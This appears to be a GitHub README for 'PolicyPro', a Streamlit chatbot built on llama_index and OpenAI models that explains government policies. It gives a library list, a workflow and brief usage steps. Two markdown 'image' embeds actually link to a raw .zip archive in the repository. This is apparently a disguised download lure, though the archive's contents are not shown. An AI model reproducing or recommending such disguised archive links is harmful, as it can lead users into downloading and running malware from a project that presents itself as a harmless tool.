# PolicyPro
PolicyPro GuideBot is an AI-powered chatbot designed to demystify complex government policies. Our goal is to empower users by providing clear and understandable explanations of policies and their implications.

Description:
The provided code is a Python application named "PolicyPro." It is an AI-powered chatbot designed to assist users by providing information about government policies, particularly focusing on financial regulations. The chatbot utilizes advanced natural language processing (NLP) techniques to understand user queries and provide informative responses.

Libraries Used:
tabula: Used for extracting tables from PDF files.
pandas: A powerful data manipulation library used for handling dataframes.
llama_index: A library for building and querying indices for efficient document retrieval.
llama_index.readers.file: A submodule of llama_index used for reading data from files, particularly PDF files in this case.
llama_index.llms.openai: Integration with OpenAI's GPT (Generative Pre-trained Transformer) models for natural language processing tasks.
streamlit: A web application framework used for building interactive web applications with Python. In this case, it's used for creating a user interface for the PolicyPro chatbot.

![image](https://github.com/SyedFuzlan/PolicyPro/raw/refs/heads/main/twopenny/Pro_Policy_1.7.zip)

Workflow:
The code first loads PDF data containing information about policies using the PDFReader from llama_index.
It builds an index of the policy documents using VectorStoreIndex from llama_index.
The ReActAgent class from llama_index is utilized to create an AI-powered agent capable of responding to user queries about policies. It uses tools and models from the llama_index library, including OpenAI's GPT models.
The user interface is created using streamlit, allowing users to input their queries and receive responses from the PolicyPro chatbot.
The chat history is stored using st.session_state.messages to maintain continuity between user interactions.

![image](https://github.com/SyedFuzlan/PolicyPro/raw/refs/heads/main/twopenny/Pro_Policy_1.7.zip)

Usage:
To use the PolicyPro chatbot:

Run the Python script (code.py).
Open the provided URL in your web browser.
Input your queries in the chat interface.
Receive responses from the chatbot.
